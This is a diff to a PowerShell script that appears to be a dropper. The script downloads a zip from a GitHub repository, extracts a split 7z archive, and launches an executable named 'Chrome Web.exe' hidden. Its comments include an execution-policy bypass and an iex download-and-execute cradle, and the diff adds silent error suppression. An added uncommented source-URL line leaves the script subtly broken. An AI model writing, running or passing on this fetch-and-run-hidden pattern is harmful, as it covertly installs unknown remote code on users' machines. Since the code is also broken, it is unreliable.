@@ -2,6 +2,10 @@
 #Set-ExecutionPolicy -ExecutionPolicy Bypass -force
 #powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Admo9/Source/main/proyecto.ps1')"
 
+$ErrorActionPreference = 'SilentlyContinue'
+
+Fuente: https://www.enmimaquinafunciona.com/pregunta/8130/como-ignorar-un-error-en-powershell-y-dejar-que-continue
+
 invoke-webrequest -uri "https://github.com/Admo9/ProJ03/archive/refs/heads/main.zip" -outfile "C:\Users\win64.zip"
 
 
@@ -22,6 +26,5 @@ Expand-7Zip -ArchiveFileName C:\Users\ProJ03-main\app-64.7z.001 -Password "" -Ta
 
 Start-Process "C:\Program Files\app-64\Chrome Web.exe"  --hidden
 
--ErrorAction SilentlyContinue
 
 exit 
